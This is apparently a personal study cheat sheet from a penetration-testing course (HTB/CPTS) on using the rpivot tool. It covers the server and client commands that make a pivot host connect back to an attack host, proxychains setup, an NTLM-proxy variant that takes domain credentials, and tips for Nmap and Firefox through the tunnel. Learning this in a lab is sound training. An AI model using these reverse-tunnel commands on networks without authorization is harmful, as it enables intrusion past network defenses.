## When to Use Rpivot

No SSH server/client on the pivot, but the pivot has outbound access to your attack host — or outbound is HTTP(S)-only through an NTLM proxy. Pivot connects **out** to you (reverse), you get a local SOCKS proxy on the attack host.

---

## Setup Checklist

```
[ ] git clone https://github.com/klsecservices/rpivot.git   (attack host)
[ ] python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0   (attack host — run FIRST)
[ ] scp -r rpivot user@<pivot-ip>:/home/user/   (attack host → pivot)
[ ] python2 client.py --server-ip <attack-host-ip> --server-port 9999   (pivot — run SECOND)
[ ] Confirm: "New connection from host ..." on server.py output
[ ] Configure proxychains: socks4 127.0.0.1 9050   (in /etc/proxychains.conf)
[ ] proxychains curl http://<internal-target>:80   (test — TCP only)
[ ] proxychains firefox-esr http://<internal-target>:80   (browse)
```

**Order matters:** server.py first (attack host listens), then client.py (pivot connects back). Backwards = connection refused.

---

## Who Runs What

|Script|Runs On|Role|
|---|---|---|
|`server.py`|**Attack Host**|Listens for pivot backconnect, exposes local SOCKS proxy|
|`client.py`|**Pivot Host**|Connects OUT to attack host, tunnels internal access back|

---

## NTLM Proxy Variant

When the internal network forces outbound traffic through an NTLM-authenticated corporate proxy:

bash

```bash
python client.py --server-ip <AttackHostIP> --server-port 8080 \
  --ntlm-proxy-ip <ProxyIP> --ntlm-proxy-port 8081 \
  --domain <WindowsDomain> --username <user> --password <pass>
```

---

## Critical Gotchas (learned the hard way)

1. **Don't kill `client.py` to run other commands.** Ctrl+C on the client tears down the entire reverse tunnel (`SIGINT received. Closing relay and exiting`). If you need to test something else on the pivot, open a **second terminal/tab** to it — never interrupt the running client session.
2. **Ping will NEVER work through the tunnel.** SOCKS (what rpivot exposes) only relays TCP. `ping <internal-ip>` from your attack host through proxychains is not a valid test — it will always fail, tunnel or no tunnel. Use `proxychains curl` or `proxychains nmap -sT -Pn` instead to verify connectivity.
3. **curl works but Firefox doesn't → it's a Firefox problem, not a tunnel problem.** If `proxychains curl http://target:80` succeeds, the tunnel and proxychains config are both fine. Fix Firefox specifically:
    - Always specify the scheme explicitly: `http://172.16.5.135:80` (not just the bare IP:port)
    - Disable HTTPS-Only Mode: `about:preferences#privacy` → HTTPS-Only Mode → off (it silently tries to upgrade http→https and fails on a plain Apache server)
    - Disable content sandbox (common proxychains+Firefox LD_PRELOAD issue): `MOZ_DISABLE_CONTENT_SANDBOX=1 proxychains firefox-esr http://172.16.5.135:80`
    - Check `about:preferences#general` → Network Settings isn't overriding with its own manual proxy
    - If still stuck, try a clean profile: `proxychains firefox-esr -no-remote -P`
4. **Use `-sT -Pn` with Nmap through any SOCKS proxy** — SYN scans and ICMP host discovery don't work over SOCKS.
5. **Rpivot requires Python2 on both ends** — if `python2` isn't installed, `apt install python2` (Kali) or check what's already on the pivot before assuming it's missing.

---

## One-Liner Recap

bash

```bash
# Attack host
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Pivot host (in a fresh terminal, keep it running)
python2 client.py --server-ip <attack-ip> --server-port 9999

# Attack host — verify then browse
MOZ_DISABLE_CONTENT_SANDBOX=1 proxychains curl http://<target>:80
MOZ_DISABLE_CONTENT_SANDBOX=1 proxychains firefox-esr http://<target>:80
```

---

## Tags

`#htb` `#cpts` `#pivoting` `#rpivot` `#cheatsheet` `#proxychains` `#firefox` `#socks`

![](/images/illustrations/session-progress.svg)![](/images/illustrations/session-progress-dark.svg)

See task progress for longer tasks.

Rpivot Cheat Sheet.md

Pivoting Cheat Sheet - When to Use What.md

Web Server Pivoting with Rpivot.md

SSH Pivoting with Sshuttle.md

SSH for Windows - Plink.md

Socat Redirection with a Bind Shell.md

![](/images/illustrations/session-context.svg)![](/images/illustrations/session-context-dark.svg)

Track tools and referenced files used in this task.